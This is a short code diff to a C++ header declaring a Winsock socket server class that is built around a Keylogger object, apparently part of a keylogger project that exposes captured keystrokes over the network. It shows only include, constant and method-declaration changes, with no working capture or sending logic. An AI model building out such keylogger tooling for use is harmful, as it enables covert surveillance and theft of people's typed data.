@@ -3,13 +3,15 @@
 #include <iostream>
 #include <string>
 #include <sstream>
-#include <WinSock2.h>
+#include <algorithm>
+#include <iterator>
+#include <regex>
+#include <winsock2.h>
 #include <WS2tcpip.h>
-#pragma comment(lib, "Ws2_32.lib")
 
 #include "Keylogger.h"
 
-#define BUFFER_SIZE 1024
+#define SOCKET_BUFFER_SIZE 1024
 
 class SocketServer {
 private:
@@ -20,6 +22,7 @@ private:
 	std::string hostName;
 
 	void initHostInfo();
+	static std::vector<std::string> parseRequest(std::string request);
 public:
 	SocketServer(Keylogger* logger);
 	void start();
